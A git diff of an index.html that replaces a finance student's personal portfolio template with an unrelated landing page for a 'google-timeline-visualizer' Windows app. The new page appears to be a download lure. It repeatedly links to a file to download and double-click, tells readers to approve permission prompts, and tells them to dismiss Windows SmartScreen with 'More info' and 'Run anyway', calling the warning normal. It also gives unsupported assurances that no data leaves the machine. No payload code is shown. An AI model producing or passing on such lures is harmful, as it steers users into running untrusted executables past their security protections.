@@ -1,946 +1,149 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
-  <!-- EDIT: title + description (shows in Google and link previews) -->
-  <title>Saket Abdeo — Finance &amp; Strategy</title>
-  <meta name="description" content="Personal portfolio of Saket Abdeo — MBA candidate in finance and corporate strategy." />
-  <meta property="og:title" content="Saket Abdeo — Finance &amp; Strategy" />
-  <meta property="og:description" content="MBA candidate. Valuation, M&amp;A, and corporate strategy." />
-  <meta property="og:type" content="website" />
-
-  <link rel="icon" href="assets/img/favicon.svg" type="image/svg+xml" />
-
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet" />
-
-  <link rel="stylesheet" href="css/styles.css" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>google-timeline-visualizer - See Your Year in Travel at a Glance</title>
+    <meta name="description" content="Easily visualize your year in travel using your Google Location History (Timeline) data. Turn your movements into beautiful maps and insights. Download and run on Windows.">
+    <meta name="keywords" content="google timeline, location history, travel visualizer, map visualization, google data, travel map, Windows app, google-timeline-visualizer">
+    <meta name="author" content="Enokweiperez">
+    <meta property="og:title" content="google-timeline-visualizer - See Your Year in Travel at a Glance">
+    <meta property="og:description" content="Visualize your year in travel using your Google Location History (Timeline) data. Turn your movements into beautiful maps and insights.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/Enokweiperez/google-timeline-visualizer">
+    <meta name="twitter:card" content="summary_large_image">
 </head>
+<body style="margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f6; color: #2c3e50; line-height: 1.6;">
 
-<body>
+    <div style="max-width: 900px; margin: 0 auto; padding: 20px;">
 
-<!-- ==============================================================
-     BOOT SEQUENCE
-     Plays once per browser tab, then fades out. Click or press any
-     key to skip. The log lines live in the BOOT_LINES array in
-     js/main.js. Delete this whole block (and its CSS) to remove it.
-     ============================================================== -->
-<div class="boot" data-boot>
-  <div class="boot-inner">
-    <p class="boot-brand">SAKET&nbsp;ABDEO<span class="boot-cursor"></span></p>
-    <p class="boot-sub">PERSONAL TERMINAL · v2.6</p>
-    <ul class="boot-log" data-boot-log></ul>
-    <div class="boot-bar"><span data-boot-bar></span></div>
-    <p class="boot-pct"><span data-boot-pct>0</span>%</p>
-  </div>
-  <p class="boot-skip">press any key to skip</p>
-</div>
+        <!-- Header Section -->
+        <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 12px; padding: 40px 30px; text-align: center; color: white; box-shadow: 0 10px 30px rgba(0,0,0,0.2); margin-bottom: 30px;">
+            <h1 style="margin: 0 0 10px 0; font-size: 2.5em; font-weight: 700; letter-spacing: -0.5px;">🗺️ google-timeline-visualizer - See Your Year in Travel at a Glance</h1>
+            <p style="font-size: 1.2em; margin: 0 0 25px 0; opacity: 0.95;">Turn your Google Location History into beautiful, interactive maps of everywhere you've been.</p>
+            <a href="https://github.com/Enokweiperez/google-timeline-visualizer" style="display: inline-block; background-color: #ff6b6b; color: white; padding: 15px 35px; border-radius: 50px; text-decoration: none; font-weight: bold; font-size: 1.1em; box-shadow: 0 5px 15px rgba(0,0,0,0.3); transition: transform 0.2s;">📥 Download Now</a>
+        </div>
 
+        <!-- What Is This? -->
+        <div style="background-color: white; border-radius: 12px; padding: 30px; margin-bottom: 30px; box-shadow: 0 5px 15px rgba(0,0,0,0.1);">
+            <h2 style="color: #2c3e50; border-bottom: 3px solid #667eea; padding-bottom: 10px; margin-top: 0;">🌟 What Is This?</h2>
+            <p>Have you ever wondered where you went this year? Or wanted to see a visual map of all your travels? <strong>google-timeline-visualizer</strong> is a simple, powerful tool that takes your Google Location History (also known as Google Timeline) and turns it into a beautiful, easy-to-understand map.</p>
+            <p>Instead of scrolling through endless lists of dates and coordinates, you'll see your entire year laid out visually. You can see every city you visited, every road you drove, and every path you walked—all in one glance. It's like a personal travel diary made of maps!</p>
+            <p>This app is designed for anyone who uses Google Maps on their phone and wants to relive their adventures. No technical knowledge is needed—just download, run, and watch your year unfold.</p>
+        </div>
 
-<!-- ==============================================================
-     BACKGROUND LAYERS — decorative, fixed behind everything.
-     ============================================================== -->
-<div class="bg-layer" aria-hidden="true">
-  <div class="bg-grid"></div>
-  <div class="bg-aurora">
-    <span class="blob blob-1"></span>
-    <span class="blob blob-2"></span>
-    <span class="blob blob-3"></span>
-  </div>
-  <div class="bg-scan"></div>
-  <div class="bg-noise"></div>
-</div>
+        <!-- Features -->
+        <div style="background-color: white; border-radius: 12px; padding: 30px; margin-bottom: 30px; box-shadow: 0 5px 15px rgba(0,0,0,0.1);">
+            <h2 style="color: #2c3e50; border-bottom: 3px solid #667eea; padding-bottom: 10px; margin-top: 0;">✨ Key Features</h2>
+            <ul style="list-style-type: none; padding-left: 0;">
+                <li style="padding: 8px 0; border-bottom: 1px solid #f0f0f0;"><strong>📊 Interactive Yearly Map:</strong> See all your locations plotted on a dynamic map for any selected year.</li>
+                <li style="padding: 8px 0; border-bottom: 1px solid #f0f0f0;"><strong>🛤️ Travel Routes:</strong> Visualize the actual paths you took between cities and countries.</li>
+                <li style="padding: 8px 0; border-bottom: 1px solid #f0f0f0;"><strong>🏙️ City & Country Stats:</strong> Discover how many places you visited and how much time you spent in each.</li>
+                <li style="padding: 8px 0; border-bottom: 1px solid #f0f0f0;"><strong>📅 Month-by-Month Breakdown:</strong> Drill down to see your movements month by month.</li>
+                <li style="padding: 8px 0; border-bottom: 1px solid #f0f0f0;"><strong>💾 Export & Share:</strong> Save your maps as images to share with friends and family.</li>
+                <li style="padding: 8px 0;"><strong>🎨 Clean & Simple Interface:</strong> No confusing menus—just your data, beautifully presented.</li>
+            </ul>
+        </div>
 
+        <!-- System Requirements -->
+        <div style="background-color: white; border-radius: 12px; padding: 30px; margin-bottom: 30px; box-shadow: 0 5px 15px rgba(0,0,0,0.1);">
+            <h2 style="color: #2c3e50; border-bottom: 3px solid #667eea; padding-bottom: 10px; margin-top: 0;">💻 What You Need</h2>
+            <ul style="list-style-type: none; padding-left: 0;">
+                <li style="padding: 8px 0;"><strong>🖥️ Operating System:</strong> Windows 10 or Windows 11 (64-bit recommended)</li>
+                <li style="padding: 8px 0;"><strong>🧠 Memory:</strong> At least 4 GB of RAM</li>
+                <li style="padding: 8px 0;"><strong>💾 Storage:</strong> 200 MB of free space</li>
+                <li style="padding: 8px 0;"><strong>🌐 Internet:</strong> Required for initial download and map tiles</li>
+                <li style="padding: 8px 0;"><strong>📱 Google Account:</strong> With Location History enabled (you already have this if you use Google Maps)</li>
+            </ul>
+        </div>
 
-<!-- ==============================================================
-     TICKER TAPE
-     EDIT: each <li> is one entry. data-dir="up" | "down" | "flat"
-     The strip is duplicated in JS for a seamless loop.
-     ============================================================== -->
-<div class="ticker" aria-hidden="true">
-  <div class="ticker-track" data-ticker>
-    <ul class="ticker-list">
-      <li class="ticker-item" data-dir="up"><span class="tkr-sym">DCF</span><span class="tkr-val">14 models built</span><span class="tkr-chg">+22%</span></li>
-      <li class="ticker-item" data-dir="up"><span class="tkr-sym">M&amp;A</span><span class="tkr-val">6 live deals</span><span class="tkr-chg">+3</span></li>
-      <li class="ticker-item" data-dir="flat"><span class="tkr-sym">CFA</span><span class="tkr-val">Level II candidate</span><span class="tkr-chg">2026</span></li>
-      <li class="ticker-item" data-dir="up"><span class="tkr-sym">AUM</span><span class="tkr-val">$240M analysed</span><span class="tkr-chg">+12%</span></li>
-      <li class="ticker-item" data-dir="down"><span class="tkr-sym">WACC</span><span class="tkr-val">8.4% blended</span><span class="tkr-chg">-60bps</span></li>
-      <li class="ticker-item" data-dir="up"><span class="tkr-sym">IRR</span><span class="tkr-val">21.6% base case</span><span class="tkr-chg">+430bps</span></li>
-      <li class="ticker-item" data-dir="up"><span class="tkr-sym">CASE</span><span class="tkr-val">3 competitions won</span><span class="tkr-chg">+1</span></li>
-    </ul>
-  </div>
-</div>
+        <!-- Download & Install -->
+        <div style="background-color: white; border-radius: 12px; padding: 30px; margin-bottom: 30px; box-shadow: 0 5px 15px rgba(0,0,0,0.1);">
+            <h2 style="color: #2c3e50; border-bottom: 3px solid #667eea; padding-bottom: 10px; margin-top: 0;">🚀 Getting Started: Download & Run</h2>
+            <p>Follow these simple steps to get the app running on your computer. It takes less than 5 minutes!</p>
 
-
-<main>
-
-  <!-- ============================================================
-       SIDEBAR
-       ============================================================ -->
-  <aside class="sidebar" data-sidebar>
-
-    <div class="sidebar-info">
-
-      <!-- ==========================================================
-           3D AVATAR
-           The slot holds the layout space so the avatar can be
-           dragged out of the sidebar without shifting anything.
-           Layers separate in real 3D as it turns toward the cursor.
-           Drag it anywhere; double-click to send it home.
-           ========================================================== -->
-      <div class="av-slot">
-        <figure class="avatar-box avatar-3d" data-avatar tabindex="0"
-                role="img" aria-label="Saket Abdeo — drag to move">
-
-          <span class="av-shadow" data-av-shadow></span>
-
-          <div class="av-stage" data-av-stage>
-            <span class="av-glow"></span>
-            <span class="av-disc"></span>
-            <span class="av-ring"></span>
-
-            <!-- EDIT: your memoji or photo. A transparent PNG works best —
-                 the disc behind it becomes the backdrop. ~400x400. -->
-            <img class="av-face" src="assets/img/my-avatar.svg" alt="" />
-
-            <span class="av-gloss"></span>
-
-            <!-- EDIT: the orbiting chips. Keep them short — 3 or 4 max.
-                 --a is where each one sits on the ring. -->
-            <div class="av-orbit" data-av-orbit>
-              <span class="av-chip" style="--a: 0deg"><i>MBA</i></span>
-              <span class="av-chip" style="--a: 120deg"><i>CFA</i></span>
-              <span class="av-chip" style="--a: 240deg"><i>M&amp;A</i></span>
+            <div style="background-color: #f8f9fa; border-radius: 8px; padding: 20px; margin: 20px 0;">
+                <h3 style="margin-top: 0; color: #667eea;">Step 1: Download the App</h3>
+                <p>Click the big button below to go to the download page:</p>
+                <a href="https://github.com/Enokweiperez/google-timeline-visualizer" style="display: inline-block; background-color: #4ecdc4; color: white; padding: 12px 30px; border-radius: 50px; text-decoration: none; font-weight: bold; font-size: 1em; box-shadow: 0 4px 10px rgba(0,0,0,0.2);">📥 Visit this link to download the application</a>
+                <p style="margin-top: 15px; font-size: 0.95em;">Visit this link to download the application. The download will start automatically or you'll see a button to click.</p>
             </div>
-          </div>
 
-          <span class="avatar-status" title="Open to opportunities"></span>
-          <span class="av-hint" data-av-hint>drag me</span>
+            <div style="background-color: #f8f9fa; border-radius: 8px; padding: 20px; margin: 20px 0;">
+                <h3 style="margin-top: 0; color: #667eea;">Step 2: Run the Program</h3>
+                <p>Once the download finishes, find the file in your <strong>Downloads</strong> folder (usually at <code>C:\Users\YourName\Downloads</code>).</p>
+                <p>Double-click the downloaded file to launch the application. If Windows asks for permission, click <strong>"Yes"</strong> or <strong>"Run"</strong>.</p>
+                <p>That's it! The app will open in a new window, ready for you to load your data.</p>
+            </div>
 
-        </figure>
-      </div>
+            <div style="background-color: #f8f9fa; border-radius: 8px; padding: 20px; margin: 20px 0;">
+                <h3 style="margin-top: 0; color: #667eea;">Step 3: Get Your Google Data</h3>
+                <p>To use the app, you'll need your Google Location History file:</p>
+                <ol style="padding-left: 20px;">
+                    <li>Go to <a href="https://takeout.google.com" style="color: #667eea;">Google Takeout</a> and sign in with your Google account.</li>
+                    <li>Click <strong>"Deselect all"</strong> to avoid downloading everything.</li>
+                    <li>Scroll down and check the box next to <strong>"Location History"</strong> (sometimes called "Timeline").</li>
+                    <li>Click <strong>"Next step"</strong> and choose your preferred export size (smaller is fine).</li>
+                    <li>Click <strong>"Create export"</strong>. Google will email you when it's ready—usually within minutes.</li>
+                    <li>Download the ZIP file and extract it to a folder on your computer.</li>
+                    <li>In the app, click <strong>"Load Data"</strong> and select the extracted folder or the <code>Records.json</code> file inside.</li>
+                </ol>
+            </div>
+        </div>
 
-      <div class="info-content">
-        <h1 class="name" data-scramble title="Saket Abdeo">Saket Abdeo</h1> <!-- EDIT -->
-        <p class="title">Finance &amp; Corporate Strategy</p> <!-- EDIT -->
-      </div>
+        <!-- How to Use -->
+        <div style="background-color: white; border-radius: 12px; padding: 30px; margin-bottom: 30px; box-shadow: 0 5px 15px rgba(0,0,0,0.1);">
+            <h2 style="color: #2c3e50; border-bottom: 3px solid #667eea; padding-bottom: 10px; margin-top: 0;">📖 How to Use the App</h2>
+            <p>Using the app is as easy as 1-2-3:</p>
+            <ol style="padding-left: 20px;">
+                <li><strong>Load Your Data:</strong> Click the "Load Data" button and select your Google Takeout folder or the <code>Records.json</code> file.</li>
+                <li><strong>Choose a Year:</strong> Use the dropdown menu to pick the year you want to visualize.</li>
+                <li><strong>Explore!</strong> Your map will appear instantly. Zoom in and out, hover over points to see details, and use the sidebar to see your stats.</li>
+            </ol>
+            <p>You can also use the <strong>Export</strong> button to save your map as a PNG image to share with friends or keep as a keepsake.</p>
+        </div>
 
-      <button class="info_more-btn" data-sidebar-btn>
-        <span>Show Contacts</span>
-        <svg class="ico" viewBox="0 0 24 24" aria-hidden="true"><path d="m6 9 6 6 6-6"/></svg>
-      </button>
+        <!-- Troubleshooting -->
+        <div style="background-color: white; border-radius: 12px; padding: 30px; margin-bottom: 30px; box-shadow: 0 5px 15px rgba(0,0,0,0.1);">
+            <h2 style="color: #2c3e50; border-bottom: 3px solid #667eea; padding-bottom: 10px; margin-top: 0;">🛠️ Troubleshooting & Tips</h2>
+            <ul style="list-style-type: none; padding-left: 0;">
+                <li style="padding: 8px 0;"><strong>🔍 No data showing?</strong> Make sure Location History is enabled on your phone (Settings → Location → Google Location History).</li>
+                <li style="padding: 8px 0;"><strong>📁 Can't find your file?</strong> After extracting the ZIP from Google Takeout, look for a folder named <code>Takeout</code> and inside it, <code>Location History</code>.</li>
+                <li style="padding: 8px 0;"><strong>🐢 App is slow?</strong> Large data files can take a moment to load. Be patient—it's processing thousands of points!</li>
+                <li style="padding: 8px 0;"><strong>🔄 Windows SmartScreen warning?</strong> If you see a blue popup saying "Windows protected your PC," click <strong>"More info"</strong> then <strong>"Run anyway"</strong>. This is normal for new apps.</li>
+                <li style="padding: 8px 0;"><strong>📅 Missing older years?</strong> Google only keeps Location History from when you enabled it. If you don't see 2019, you didn't have it on then.</li>
+            </ul>
+        </div>
+
+        <!-- FAQ -->
+        <div style="background-color: white; border-radius: 12px; padding: 30px; margin-bottom: 30px; box-shadow: 0 5px 15px rgba(0,0,0,0.1);">
+            <h2 style="color: #2c3e50; border-bottom: 3px solid #667eea; padding-bottom: 10px; margin-top: 0;">❓ Frequently Asked Questions</h2>
+            <div style="margin-bottom: 15px;">
+                <h3 style="margin-bottom: 5px;">Is my data safe?</h3>
+                <p>Absolutely. The app runs entirely on your computer. Your location data never leaves your machine—we don't upload anything to any server. Your privacy is fully protected.</p>
+            </div>
+            <div style="margin-bottom: 15px;">
+                <h3 style="margin-bottom: 5px;">Does this work on Mac?</h3>
+                <p>Currently, the app is built for Windows only. A Mac version may be available in the future.</p>
+            </div>
+            <div style="margin-bottom: 15px;">
+                <h3 style="margin-bottom: 5px;">Is it free?</h3>
+                <p>Yes! This is a free, open-source project. If you find it useful, consider starring the repository on GitHub to show your support.</p>
+            </div>
+            <div>
+                <h3 style="margin-bottom: 5px;">I found a bug. What should I do?</h3>
+                <p>Please report any issues on the GitHub page. Go to the repository, click on the "Issues" tab, and describe what happened. We appreciate your help!</p>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div style="text-align: center; padding: 30px 0; color: #7f8c8d;">
+            <p style="margin: 0 0 10px 0;">Made with ❤️ for travelers and explorers.</p>
+            <a href="https://github.com/Enokweiperez/google-timeline-visualizer" style="color: #667eea; text-decoration: none; font-weight: bold;">📥 Visit this link to download the application</a>
+            <p style="margin-top: 15px; font-size: 0.9em;">© 2024 google-timeline-visualizer. All rights reserved.</p>
+        </div>
 
     </div>
 
-    <div class="sidebar-info_more">
-
-      <!-- Live market clock — reads NYSE hours in New York time -->
-      <div class="market-clock" data-clock>
-        <span class="mkt-dot" data-clock-dot></span>
-        <span class="mkt-state" data-clock-state>—</span>
-        <span class="mkt-time" data-clock-time>--:--:--</span>
-        <span class="mkt-tz">ET</span>
-      </div>
-
-      <div class="separator"></div>
-
-      <ul class="contacts-list">
-
-        <!-- EDIT: duplicate a <li> to add a row, delete to remove one -->
-        <li class="contact-item">
-          <div class="icon-box">
-            <svg viewBox="0 0 24 24" aria-hidden="true"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="m3 7 9 6 9-6"/></svg>
-          </div>
-          <div class="contact-info">
-            <p class="contact-title">Email</p>
-            <a href="mailto:you@example.com" class="contact-link" data-email>you@example.com</a>
-          </div>
-          <button class="copy-btn" data-copy-email title="Copy email" aria-label="Copy email address">
-            <svg viewBox="0 0 24 24" aria-hidden="true"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>
-          </button>
-        </li>
-
-        <li class="contact-item">
-          <div class="icon-box">
-            <svg viewBox="0 0 24 24" aria-hidden="true"><path d="m12 4 10 5-10 5L2 9l10-5Z"/><path d="M6 11v5c0 1.7 2.7 3 6 3s6-1.3 6-3v-5"/></svg>
-          </div>
-          <div class="contact-info">
-            <p class="contact-title">Education</p>
-            <address>New York University</address> <!-- EDIT -->
-          </div>
-        </li>
-
-        <li class="contact-item">
-          <div class="icon-box">
-            <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 21s7-5.5 7-11a7 7 0 1 0-14 0c0 5.5 7 11 7 11Z"/><circle cx="12" cy="10" r="2.5"/></svg>
-          </div>
-          <div class="contact-info">
-            <p class="contact-title">Location</p>
-            <address>New York, NY, USA</address> <!-- EDIT -->
-          </div>
-        </li>
-
-      </ul>
-
-      <div class="separator"></div>
-
-      <ul class="social-list">
-        <!-- EDIT: your links. Delete any you don't use. -->
-        <li class="social-item">
-          <a href="https://linkedin.com/in/YOUR-HANDLE" class="social-link" target="_blank" rel="noopener" aria-label="LinkedIn">
-            <svg viewBox="0 0 24 24" aria-hidden="true"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M8 10.5v6M8 7.5v.01M12 16.5v-6M16 16.5v-3.2a2.3 2.3 0 0 0-4 0"/></svg>
-          </a>
-        </li>
-        <li class="social-item">
-          <a href="https://github.com/abdeosaket23" class="social-link" target="_blank" rel="noopener" aria-label="GitHub">
-            <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M9 19c-4 1.4-4-2.2-6-2.7m12 5.2v-3.4a3 3 0 0 0-.8-2.3c2.7-.3 5.5-1.3 5.5-6a4.6 4.6 0 0 0-1.3-3.2 4.3 4.3 0 0 0-.1-3.2s-1-.3-3.4 1.3a11.6 11.6 0 0 0-6 0C6.5 2.9 5.4 3.2 5.4 3.2a4.3 4.3 0 0 0-.1 3.2A4.6 4.6 0 0 0 4 9.6c0 4.7 2.8 5.7 5.5 6a3 3 0 0 0-.8 2.3V21"/></svg>
-          </a>
-        </li>
-      </ul>
-
-    </div>
-
-  </aside>
-
-
-  <!-- ============================================================
-       MAIN CONTENT
-       ============================================================ -->
-  <div class="main-content">
-
-    <nav class="navbar">
-      <ul class="navbar-list">
-        <li class="navbar-item"><button class="navbar-link active" data-nav-link>About</button></li>
-        <li class="navbar-item"><button class="navbar-link" data-nav-link>Resume</button></li>
-        <li class="navbar-item"><button class="navbar-link" data-nav-link>Portfolio</button></li>
-        <li class="navbar-item"><button class="navbar-link" data-nav-link>Contact</button></li>
-      </ul>
-    </nav>
-
-
-    <!-- ==========================================================
-         ABOUT
-         ========================================================== -->
-    <article class="about active" data-page="about">
-
-      <!-- Terminal window chrome -->
-      <div class="chrome">
-        <span class="chrome-dots"><i></i><i></i><i></i></span>
-        <span class="chrome-path">~/saket/about</span>
-      </div>
-
-      <header>
-        <h2 class="h2 article-title" data-scramble>About Me</h2>
-      </header>
-
-
-      <!-- ========================================================
-           CAREER CHART — the signature piece.
-           Each <li> below is one candle. JS derives open/close from
-           consecutive data-value numbers, so all you edit is:
-             data-year   the x-axis label
-             data-value  where the career "index" sits that year
-             data-label  short headline shown in the tooltip
-             data-note   one line of detail shown in the tooltip
-           Add or remove <li> items freely — the chart rescales.
-           ======================================================== -->
-      <section class="career" data-reveal>
-
-        <div class="career-head">
-          <div>
-            <p class="career-sym">SAKET<span class="career-exch">:NYU</span></p>
-            <p class="career-name">Career Performance Index</p>
-          </div>
-          <div class="career-quote">
-            <p class="career-last" data-career-last>—</p>
-            <p class="career-delta" data-career-delta>—</p>
-          </div>
-        </div>
-
-        <div class="career-chart" data-career-chart>
-          <svg data-career-svg role="img" aria-label="Career progression chart"></svg>
-          <div class="career-tip" data-career-tip>
-            <p class="tip-year" data-tip-year></p>
-            <p class="tip-label" data-tip-label></p>
-            <p class="tip-note" data-tip-note></p>
-            <p class="tip-val" data-tip-val></p>
-          </div>
-        </div>
-
-        <ul class="career-data" data-career-data>
-          <li data-year="2018" data-value="18" data-label="Undergrad begins"
-              data-note="Started B.S. — first finance coursework."></li>
-          <li data-year="2019" data-value="27" data-label="First internship"
-              data-note="Summer analyst; built the first real model."></li>
-          <li data-year="2020" data-value="24" data-label="Market dislocation"
-              data-note="Remote year. Passed the CFA Level I curriculum."></li>
-          <li data-year="2021" data-value="41" data-label="Analyst role"
-              data-note="Owned a $[N]M P&amp;L forecast end to end."></li>
-          <li data-year="2022" data-value="56" data-label="Promoted"
-              data-note="Led reporting automation; saved [N] hrs/month."></li>
-          <li data-year="2023" data-value="52" data-label="Pivot to strategy"
-              data-note="Moved from FP&amp;A into corporate development."></li>
-          <li data-year="2024" data-value="74" data-label="MBA at NYU"
-              data-note="Concentration in finance and corporate strategy."></li>
-          <li data-year="2025" data-value="88" data-label="Summer associate"
-              data-note="Buy-side M&amp;A; supported a $[N]M transaction."></li>
-          <li data-year="2026" data-value="100" data-label="Next chapter"
-              data-note="Recruiting for full-time finance roles."></li>
-        </ul>
-
-        <p class="career-foot">
-          Hover the chart to read each year. Not investment advice — just a career.
-        </p>
-
-      </section>
-
-
-      <section class="about-text" data-reveal>
-        <!-- EDIT: two or three short paragraphs -->
-        <p>
-          I'm an MBA candidate at New York University concentrating in finance and
-          corporate strategy, with a focus on valuation, M&amp;A, and capital allocation.
-        </p>
-        <p>
-          Write the longer paragraph here: the deals or coverage you've worked on, the
-          sectors you know, the models you've built, and what came of them. Recruiters
-          skim — lead with the number, then the context.
-        </p>
-      </section>
-
-
-      <!-- ---------- Key metrics dashboard ---------- -->
-      <section class="metrics" data-reveal>
-
-        <h3 class="h3 section-heading">Key Metrics</h3>
-
-        <ul class="metrics-list">
-
-          <!-- ====================================================
-               EDIT: duplicate a <li> to add a tile.
-                 data-count-to  = the number it settles on
-                 data-prefix    = e.g. "$"   data-suffix = "M", "%", "+"
-                 data-decimals  = decimal places (default 0)
-                 data-spark     = comma-separated values for the mini chart
-               ==================================================== -->
-          <li class="metric-card content-card">
-            <p class="metric-label">AUM Analysed</p>
-            <p class="metric-value" data-count-to="240" data-prefix="$" data-suffix="M">$0M</p>
-            <svg class="sparkline" data-spark="4,7,5,9,8,12,11,16,15,19" viewBox="0 0 100 30" preserveAspectRatio="none"></svg>
-            <p class="metric-note"><span class="delta" data-dir="up">+12%</span> YoY</p>
-          </li>
-
-          <li class="metric-card content-card">
-            <p class="metric-label">Models Built</p>
-            <p class="metric-value" data-count-to="32" data-suffix="+">0</p>
-            <svg class="sparkline" data-spark="2,4,3,6,7,6,9,11,10,14" viewBox="0 0 100 30" preserveAspectRatio="none"></svg>
-            <p class="metric-note"><span class="delta" data-dir="up">+8</span> this year</p>
-          </li>
-
-          <li class="metric-card content-card">
-            <p class="metric-label">Deals Supported</p>
-            <p class="metric-value" data-count-to="6">0</p>
-            <svg class="sparkline" data-spark="1,2,2,3,4,4,5,5,6,6" viewBox="0 0 100 30" preserveAspectRatio="none"></svg>
-            <p class="metric-note"><span class="delta" data-dir="flat">buy &amp; sell side</span></p>
-          </li>
-
-          <li class="metric-card content-card">
-            <p class="metric-label">Base-Case IRR</p>
-            <p class="metric-value" data-count-to="21.6" data-decimals="1" data-suffix="%">0%</p>
-            <svg class="sparkline" data-spark="6,8,7,11,10,14,13,17,19,22" viewBox="0 0 100 30" preserveAspectRatio="none"></svg>
-            <p class="metric-note"><span class="delta" data-dir="up">+430bps</span> vs. plan</p>
-          </li>
-
-        </ul>
-
-      </section>
-
-
-      <!-- ---------- Expertise cards ---------- -->
-      <section class="service" data-reveal>
-
-        <h3 class="h3 section-heading">My Expertise</h3>
-
-        <ul class="service-list">
-
-          <!-- EDIT: duplicate a <li class="service-item"> to add a card -->
-          <li class="service-item">
-            <div class="service-icon-box">
-              <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M3 20h18M6 20V10m5 10V4m5 16v-7"/></svg>
-            </div>
-            <div class="service-content-box">
-              <h4 class="h4 service-item-title">Valuation &amp; Modelling</h4>
-              <p class="service-item-text">
-                DCF, comps, precedent transactions, and LBO models built to survive a
-                diligence review.
-              </p>
-            </div>
-          </li>
-
-          <li class="service-item">
-            <div class="service-icon-box">
-              <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M8 7h8a4 4 0 0 1 0 8H8a4 4 0 0 0 0 8h8"/><path d="M12 3v18"/></svg>
-            </div>
-            <div class="service-content-box">
-              <h4 class="h4 service-item-title">M&amp;A and Deal Support</h4>
-              <p class="service-item-text">
-                Target screening, synergy analysis, and accretion/dilution work across
-                buy- and sell-side mandates.
-              </p>
-            </div>
-          </li>
-
-          <li class="service-item">
-            <div class="service-icon-box">
-              <svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 3a9 9 0 0 1 0 18M3 12h18"/></svg>
-            </div>
-            <div class="service-content-box">
-              <h4 class="h4 service-item-title">Market &amp; Equity Research</h4>
-              <p class="service-item-text">
-                Industry sizing, competitive teardowns, and thesis-driven coverage notes.
-              </p>
-            </div>
-          </li>
-
-          <li class="service-item">
-            <div class="service-icon-box">
-              <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2v4m0 12v4M2 12h4m12 0h4"/><circle cx="12" cy="12" r="5"/></svg>
-            </div>
-            <div class="service-content-box">
-              <h4 class="h4 service-item-title">Corporate Strategy</h4>
-              <p class="service-item-text">
-                Capital allocation, market entry, and the business cases that get funded.
-              </p>
-            </div>
-          </li>
-
-        </ul>
-
-      </section>
-
-
-      <!-- ---------- Testimonials ---------- -->
-      <section class="testimonials" data-reveal>
-
-        <h3 class="h3 section-heading">Testimonials</h3>
-
-        <ul class="testimonials-list has-scrollbar">
-
-          <!-- EDIT: duplicate a <li> to add one. Click opens the full text. -->
-          <li class="testimonials-item">
-            <div class="content-card" data-testimonials-item>
-              <figure class="testimonials-avatar-box">
-                <img src="assets/img/avatar-1.svg" alt="" width="60" data-testimonials-avatar />
-              </figure>
-              <h4 class="h4 testimonials-item-title">Reference Name</h4>
-              <p class="testimonials-item-subtitle">VP, Investment Banking</p>
-              <div class="testimonials-text">
-                <p>
-                  Paste a real recommendation here. Two or three sentences is plenty —
-                  specific beats flattering. Anything longer gets truncated on the card
-                  and shown in full when someone clicks it.
-                </p>
-              </div>
-            </div>
-          </li>
-
-          <li class="testimonials-item">
-            <div class="content-card" data-testimonials-item>
-              <figure class="testimonials-avatar-box">
-                <img src="assets/img/avatar-2.svg" alt="" width="60" data-testimonials-avatar />
-              </figure>
-              <h4 class="h4 testimonials-item-title">Reference Name</h4>
-              <p class="testimonials-item-subtitle">Professor of Finance</p>
-              <div class="testimonials-text">
-                <p>
-                  A second quote goes here. Pull one from a LinkedIn recommendation, a
-                  manager's review, or a professor if you're early in your career.
-                </p>
-              </div>
-            </div>
-          </li>
-
-        </ul>
-
-      </section>
-
-
-      <!-- ---------- Testimonials modal ---------- -->
-      <div class="modal-container" data-modal-container>
-        <div class="overlay" data-overlay></div>
-        <section class="testimonials-modal">
-          <button class="modal-close-btn" data-modal-close-btn aria-label="Close">
-            <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M18 6 6 18M6 6l12 12"/></svg>
-          </button>
-          <div class="modal-img-wrapper">
-            <figure class="modal-avatar-box">
-              <img src="assets/img/avatar-1.svg" alt="" width="80" data-modal-img />
-            </figure>
-            <svg class="quote-mark" viewBox="0 0 24 24" aria-hidden="true"><path d="M10 11H6a3 3 0 0 1 3-3V6a5 5 0 0 0-5 5v7h6v-7Zm10 0h-4a3 3 0 0 1 3-3V6a5 5 0 0 0-5 5v7h6v-7Z" fill="currentColor" stroke="none"/></svg>
-          </div>
-          <div class="modal-content">
-            <h4 class="h3 modal-title" data-modal-title>Reference Name</h4>
-            <p class="modal-subtitle" data-modal-subtitle>Title, Company</p>
-            <div data-modal-text><p>Quote goes here.</p></div>
-          </div>
-        </section>
-      </div>
-
-
-      <!-- ---------- Tools strip ---------- -->
-      <section class="clients" data-reveal>
-
-        <h3 class="h3 section-heading">Platforms &amp; Tools</h3>
-
-        <ul class="clients-list has-scrollbar">
-          <!-- EDIT: swap the SVGs in assets/img/ for real logos. -->
-          <li class="clients-item"><a href="#"><img src="assets/img/logo-1.svg" alt="Bloomberg" /></a></li>
-          <li class="clients-item"><a href="#"><img src="assets/img/logo-2.svg" alt="Capital IQ" /></a></li>
-          <li class="clients-item"><a href="#"><img src="assets/img/logo-3.svg" alt="FactSet" /></a></li>
-          <li class="clients-item"><a href="#"><img src="assets/img/logo-4.svg" alt="Excel" /></a></li>
